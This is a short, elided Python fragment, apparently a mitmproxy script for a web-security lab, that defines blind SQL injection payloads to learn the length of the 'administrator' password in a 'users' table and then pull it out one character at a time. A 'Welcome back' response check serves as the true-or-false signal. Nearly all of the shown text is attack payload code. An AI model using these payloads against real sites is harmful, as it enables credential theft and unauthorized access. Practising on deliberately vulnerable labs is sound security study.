...
PAYLOAD_PSWD_LEN = "'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)={})='a"
PAYLOAD_PSWD = "'+AND+(SELECT+SUBSTRING(password,{i},1)+FROM+users+WHERE+username='administrator')='{c}"
...
class Pswd:
    ...
    def response(self, flow: http.HTTPFlow):
        ...
        if self.connected:
            if "Welcome back" in flow.response.text:
